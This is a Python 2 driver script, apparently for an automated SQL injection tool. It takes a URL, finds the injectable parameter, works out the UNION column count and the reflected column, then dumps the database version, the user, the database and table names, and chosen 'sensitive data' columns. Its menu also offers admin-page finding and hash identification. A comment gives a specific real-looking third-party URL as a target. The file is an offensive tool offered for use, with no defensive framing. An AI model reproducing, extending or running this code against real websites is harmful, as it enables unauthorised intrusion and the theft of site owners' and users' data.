import s_data
import dbs
import replaces
from prints import print_data, print_cols_tables, intro
from requests import get_the_page
from find_total_cols import ft_cols, uni_cols
from vulnerable import vuln, f_vuln_col
from response import site_alive
from search_in_columns import search_in_columns
# www.gpavlos.gr/print.php?id=1'


class inject_database:

    def __init__(self, site, vuln_param):
        self.site = site
        self.back_up_site = site
        self.vuln_param = vuln_param

    def total_columns(self):
        self.columns, self.based = ft_cols(self.site)
        self.site = uni_cols(self.site, self.columns, self.based)
        self.site = self.site.replace(self.vuln_param, self.vuln_param + '-')

    def vulnerable_column(self):
        self.vuln_column = str(f_vuln_col(self.site, self.columns))
        self.site = replaces.repl(self.site, 1, self.vuln_column)

    def database_information(self):
        self.db_version = dbs.version(self.site)
        print "SQL Version: %s" % self.db_version

        self.db_user = dbs.user(self.site)
        print "Current user is: %s" % self.db_user

        self.db_names = dbs.names(self.site)
        print_cols_tables(self.db_names, 'Databases')

        self.working_on_db = dbs.working_db(self.site)
        print "You are on: %s database" % self.working_on_db
        self.site = replaces.repl(self.site, 2, self.working_on_db)

        change_database = raw_input("Do you want to change database? (y/n): ")
        if change_database == "y":
            self.change_database()

    def find_tables_of_database(self):
        self.the_page = get_the_page(self.site, "2")
        self.tables = s_data.search_for(self.the_page)

        if not len(self.tables):
            print "Could not get the tables, program will exit."
            exit()

        print_cols_tables(self.tables, 'Tables Found')
        self.site = replaces.repl(self.site, 3, self.working_on_db)
        if not self.based == '':
            self.site = site.replace(self.based, '')

    def select_table(self):
        print "Give the table: "
        self.table_choose = raw_input(">>> ")
        while not(self.table_choose in self.tables):
            print "Wrong input. Give the table: "
            self.table_choose = raw_input(">>> ")

        self.table_choose = self.table_choose.encode("hex")

    def search_data_from_columns(self):
        self.sensitive_data = search_in_columns(
            self.site, self.table_choose, self.based, self.working_on_db)

    # Afth thn function na thn dw argotera
    def change_database(self):
        print_cols_tables(self.db_names, 'Databases')
        self.working_on_db = raw_input(
            "On which Database you want to work on?: ")
        while self.working_on_db not in self.db_names:
            self.working_on_db = raw_input(
                "Wrong Input!\nOn which Database you want to work on?: ")

        self.site = replaces.repl(self.site, 2, self.working_on_db)

if __name__ == '__main__':
    intro()
    option = 0

    while not option:
        print "1.| Inject DB from site."
        print "2.| Hash ID."
        print "3.| Find admin page."
        option = raw_input(">>> ")

    if option:
        flag = 1

        while flag:
            site = raw_input("Give the url: ")

            if "'" in site:
                site = site_alive(site)
                vuln_param = vuln(site)
                flag = 0

        if not flag:
            find_data = inject_database(site, vuln_param)
            find_data.total_columns()
            find_data.vulnerable_column()
            find_data.database_information()
            find_data.find_tables_of_database()
            find_data.select_table()
            find_data.search_data_from_columns()
